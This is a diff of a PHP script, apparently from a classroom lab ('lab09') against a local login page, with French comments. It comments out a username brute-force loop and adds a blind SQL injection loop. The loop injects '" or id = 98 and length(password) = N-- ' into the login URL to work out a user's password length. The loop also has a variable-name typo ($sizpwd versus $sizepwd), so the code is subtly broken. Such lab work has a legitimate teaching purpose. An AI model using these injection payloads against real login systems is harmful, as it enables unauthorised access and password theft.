@@ -6,7 +6,8 @@
 
 
 
-
+//Cette partie est pour l'username "brute force"
+/*
 for ($i = 1; $i <= 5; $i++) {
     foreach (range('a', 'z') as $letter){
          //echo "$letter \n";
@@ -17,12 +18,32 @@ for ($i = 1; $i <= 5; $i++) {
 			print "$letter";
 			break;
 		}else{
-			//echo "\n";
-			//echo "nope";
+			
 		}
 	}   
-} 
+}
+*/
 
+
+$sizepwd = 0;
+while ($sizpwd < 25)
+{
+    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(password)%20=%20$sizepwd--%20";
+	$result = file_get_contents($url);
+	if (strpos($result, 'cat') !== false) {
+		echo "\n";
+		
+		break;
+	}else{
+		//echo "\n";
+		//echo "nope";
+	}
+
+	$sizepwd++;
+}
+
+echo 'sizepwd is ';
+print $sizepwd;
 
 
 /*Ceci marche
